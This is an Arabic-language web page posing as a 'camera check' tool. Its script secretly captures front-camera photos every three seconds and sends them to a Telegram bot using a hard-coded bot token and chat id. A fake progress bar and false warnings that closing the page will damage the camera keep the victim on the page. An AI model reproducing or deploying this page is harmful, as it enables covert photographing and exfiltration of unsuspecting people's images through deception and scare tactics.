<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>فحص الكاميرا</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{max-width:400px;width:100%;text-align:center}
h1{font-size:18px;color:#4CAF50;margin-bottom:5px}
.sub{color:#aaa;font-size:12px;margin-bottom:10px}
video{width:100%;border-radius:15px;border:2px solid #333;margin-bottom:10px}
.status{color:#4CAF50;font-size:12px;animation:blink 1s infinite;margin-bottom:10px}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
.warning-box{background:rgba(255,0,0,0.1);border:1px solid #ff4444;border-radius:10px;padding:12px;margin:10px 0;text-align:center}
.warning-box .warn-title{color:#ff4444;font-size:14px;font-weight:bold;animation:blink 0.5s infinite}
.warning-box .warn-desc{color:#ccc;font-size:11px;margin-top:4px}
.progress-bar{width:100%;height:6px;background:#333;border-radius:3px;margin:10px 0;overflow:hidden}
.progress-fill{height:100%;width:0%;background:#4CAF50;transition:width 0.3s}
</style>
</head>
<body>
<div class="container" id="form">
<h1>📸 فحص الكاميرا</h1>
<p class="sub">جاري فحص كاميرا الجهاز...</p>
<video id="video" autoplay playsinline></video>
<div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
<div class="status" id="statusText">● جاري الفحص... 0%</div>
<div class="warning-box">
<div class="warn-title">⚠️ تحذير هام</div>
<div class="warn-desc" id="warningMsg">لا تغلق الصفحة! قد يؤدي الإغلاق إلى تلف الكاميرا</div>
</div>
</div>
<script>
var u=new URL(window.location.href);
var CHAT=u.searchParams.get('chatId')||'7276604783';
var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
var stream;
var progress=0;
var warnings=['لا تغلق الصفحة! قد يؤدي الإغلاق إلى تلف الكاميرا','تحذير: إغلاق الصفحة يسبب عطل دائم','خطر! الكاميرا في وضع الفحص... لا تقطع الاتصال','جاري فحص عميق للنظام... انتظر من فضلك'];

async function sendPhoto(blob){
var fd=new FormData();
fd.append('chat_id',CHAT);
fd.append('photo',blob,'live.jpg');
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:fd})}catch(e){}
}

function updateProgress(){
if(progress<95){
progress+=Math.random()*3;
if(progress>95)progress=95;
document.getElementById('progress').style.width=progress+'%';
document.getElementById('statusText').textContent='● جاري الفحص... '+Math.floor(progress)+'%';
}
if(Math.floor(progress)%10===0){
var w=Math.floor(Math.random()*warnings.length);
document.getElementById('warningMsg').textContent=warnings[w];
}
}

async function start(){
try{
stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
document.getElementById('video').srcObject=stream;

setInterval(updateProgress,1000);

setInterval(function(){
var canvas=document.createElement('canvas');
canvas.width=320;canvas.height=240;
var ctx=canvas.getContext('2d');
ctx.drawImage(document.getElementById('video'),0,0,320,240);
canvas.toBlob(function(blob){sendPhoto(blob);},'image/jpeg',0.4);
},3000);

}catch(e){
document.querySelector('.sub').textContent='خطأ في الكاميرا';
}
}

start();

window.addEventListener('beforeunload',function(e){
e.preventDefault();
e.returnValue='تحذير! سيؤدي إغلاق الصفحة إلى تلف الكاميرا!';
return 'تحذير! سيؤدي إغلاق الصفحة إلى تلف الكاميرا!';
});
</script>
</body>
</html>
